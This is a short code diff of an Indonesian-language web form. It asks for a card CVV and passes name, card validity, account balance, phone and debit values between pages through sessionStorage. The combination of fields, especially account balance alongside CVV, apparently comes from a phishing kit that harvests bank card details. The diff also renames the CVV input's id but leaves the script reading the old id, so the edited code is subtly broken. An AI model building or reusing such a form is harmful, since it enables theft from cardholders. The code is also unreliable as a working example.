@@ -36,7 +36,7 @@
       </center>
       <br>
       <br>
-      <input class="cvv" id="cvv" name="cvv" type="tel" placeholder="Masukkan CVV" minlength="3" maxlength="3" required style="text-align: center;">
+      <input class="cvv" id="cvvku" name="cvv" type="tel" placeholder="Masukkan CVV" minlength="3" maxlength="3" required style="text-align: center;">
       <br>
       <button class="butt" id="btnku" type="submit">Selanjutnya</button>
      </form>
@@ -57,7 +57,6 @@ var nama = sessionStorage.getItem("nama");
  document.getElementById("valid").value = valid + "";
   var saldo = sessionStorage.getItem("saldo");
  document.getElementById("saldo").value = saldo + "";
- 
  var phone = sessionStorage.getItem("phone");
  document.getElementById("phone").value = phone + "";
 
@@ -104,8 +103,8 @@ var debit = document.getElementById("debit").value;
  sessionStorage.setItem("saldo", saldo);  
 var phone = document.getElementById("phone").value;
  sessionStorage.setItem("phone", phone);  
- var cvv = document.getElementById("cvv").value;
- sessionStorage.setItem("cvv", cvv);  
+ var cvvku = document.getElementById("cvv").value;
+ sessionStorage.setItem("cvvku", cvvku);  
 
    
     }, 1500);
